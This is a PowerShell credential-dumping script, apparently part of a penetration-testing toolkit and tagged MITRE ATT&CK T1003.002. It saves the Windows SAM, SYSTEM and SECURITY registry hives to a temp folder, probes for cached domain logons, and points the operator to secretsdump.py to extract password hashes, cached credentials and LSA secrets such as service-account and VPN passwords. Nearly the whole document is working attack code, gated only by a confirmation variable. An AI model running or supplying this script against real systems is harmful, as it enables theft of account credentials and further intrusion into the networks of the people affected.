# gather/windows/hashdump.ps1 — Dump SAM/SYSTEM hives for offline cracking
# Requires: Local Administrator
# Read-only: NO — creates hive copies (state-changing, documented)
# Sensitive-output: YES — may print credential material or credential-bearing artifacts
# Pattern: EVIDENCE → SAVE HIVES → VERIFY/HANDOFF
# Confirmation: set $ConfirmDump = $true before running
# MITRE ATT&CK: T1003.002 — SAM Registry

$ErrorActionPreference = 'SilentlyContinue'

function Sec($n) { Write-Output "`n=== $n ===" }
function Run($c) { Write-Output "PS> $c"; Invoke-Expression $c }

if (-not (Get-Variable -Name ConfirmDump -ErrorAction SilentlyContinue) -or -not $ConfirmDump) {
    Write-Error "Set `$ConfirmDump = `$true before running; this writes SAM/SYSTEM/SECURITY hive copies to the target."
    exit 1
}

Sec 'SAM_SYSTEM_HIVE_DUMP'
Write-Output "[!] State-changing: saves registry hives to C:\Windows\Temp"

$outPath = "$env:TEMP"
try {
    reg save HKLM\SAM "$outPath\sam.hiv" /y 2>$null
    reg save HKLM\SYSTEM "$outPath\system.hiv" /y 2>$null
    reg save HKLM\SECURITY "$outPath\security.hiv" /y 2>$null
    Write-Output "[+] Hives saved to $outPath (sam.hiv, system.hiv, security.hiv)"
    Write-Output "[*] Transfer to harness then: secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL"
} catch {
    Write-Output "[-] Failed to save hives: $_"
    Write-Output "[*] Alternative: use secretsdump.py remotely with admin creds"
}

Sec 'CACHED_DOMAIN_LOGONS'
try {
    $cached = (Get-ItemProperty "HKLM:\SECURITY\Cache" -ErrorAction SilentlyContinue)
    if ($cached) {
        Write-Output "[+] Cached logons found (NL`$1..NL`$10)"
        Write-Output "[*] Extract with: secretsdump.py -security security.hiv -system system.hiv LOCAL"
    }
} catch {
    Write-Output "[*] Cannot read cached logons (need SYSTEM)"
}

Sec 'LSA_SECRETS_HINT'
Write-Output "[*] LSA secrets in SECURITY hive — extract with secretsdump.py"
Write-Output "[*] May contain: service account passwords, VPN credentials, autologon creds"
